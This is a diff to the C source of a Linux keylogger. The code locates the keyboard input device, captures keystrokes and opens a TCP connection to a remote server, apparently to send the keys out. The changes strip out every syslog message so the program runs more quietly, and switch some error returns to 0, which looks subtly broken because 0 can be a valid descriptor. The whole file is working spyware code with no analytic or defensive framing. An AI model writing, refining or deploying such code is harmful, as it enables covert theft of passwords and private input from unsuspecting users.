@@ -3,7 +3,6 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include <syslog.h>
 #include <string.h>
 #include <errno.h>
 #include <signal.h>
@@ -52,7 +51,6 @@ void startKeylogger(int keyboard, int fd)
         }
     }
 end:
-    syslog(LOG_ERR, "Shutting down keylogger, cause: %s", strerror(errno));
     close(fd);
     close(keyboard);
     free(kbd_events);
@@ -87,10 +85,7 @@ int findKeyboardDevice(char *dir_path)
     char *file_path;
 
     if ((dir = opendir(dir_path)) < 0)
-    {
-        syslog(LOG_ERR, "Couldn't open %s: %s", dir_path, strerror(errno));
         return -1;
-    }
 
     while ((file = readdir(dir)) != NULL) /* We need to check every file of the directory */
     {
@@ -106,7 +101,6 @@ int findKeyboardDevice(char *dir_path)
 
         if (lstat(file_path, &file_info) < 0) /* Getting current file info */
         {
-            syslog(LOG_ERR, "Couldn't get %s info: %s", file_path, strerror(errno));
             continue;
         }
         if (!S_ISDIR(file_info.st_mode)) /* If current file is not a directory.. */
@@ -116,7 +110,6 @@ int findKeyboardDevice(char *dir_path)
                 int keyboard_fd;
                 if (isKeyboardDevice(file_path, &keyboard_fd)) /* .. and it is a keyboard device, we return its file descriptor */
                 {
-                    syslog(LOG_ERR, "Keyboard device driver found: %s", file_path);
                     free(file_path);
                     return keyboard_fd;
                 }
@@ -152,7 +145,7 @@ int isKeyboardDevice(char *path, int *keyboard_device)
     fd = open(path, O_RDONLY);
 
     if (fd < 0)
-        syslog(LOG_ERR, "Couldn't open %s: %s", path, strerror(errno));
+        return 0;
 
     if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0) // Getting bit events supported by device
     {
@@ -177,11 +170,11 @@ int openConnectionWithServer(char *ip, short port)
     struct sockaddr_in server;
 
     if ((host_info = gethostbyname(ip)) == NULL) /* Translating hostname into Ip address */
-        return -1;
+        return 0;
 
     sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); /* Opening Tcp socket */
     if (sock_fd < 0)
-        return -1;
+        return 0;
 
     bzero(&server, sizeof(server));
 
@@ -190,7 +183,7 @@ int openConnectionWithServer(char *ip, short port)
     server.sin_port = htons(port);
 
     if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0) /* Connecting to server */
-        return -1;
+        return 0;
 
     return sock_fd;
 }
